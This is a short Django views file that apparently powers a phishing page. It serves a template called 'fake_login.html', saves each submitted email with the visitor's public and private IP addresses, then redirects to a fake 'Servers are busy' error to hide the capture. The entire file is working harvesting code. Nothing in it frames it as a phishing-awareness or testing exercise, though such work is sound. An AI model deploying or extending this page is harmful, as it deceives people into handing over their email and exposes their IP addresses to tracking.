import socket
from django.http import HttpResponse, HttpResponseRedirect
from django.shortcuts import render
from ipware import get_client_ip
from .models import User
from .forms import LoginForm


def index(request):
    pub_ip, is_routable = get_client_ip(request)
    priv_ip = request.META['REMOTE_ADDR']

    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            # get the email from the form
            email = form.cleaned_data['email']
            # save to database
            User.objects.get_or_create(
                email=email,
                pub_ip=pub_ip,
                priv_ip=priv_ip
            )
            return HttpResponseRedirect('error/')
    else:
        form = LoginForm()

    return render(request, 'fake_login.html', {'form': form})


def fake_error(request):
    return HttpResponse('Servers are busy, please try again later.')
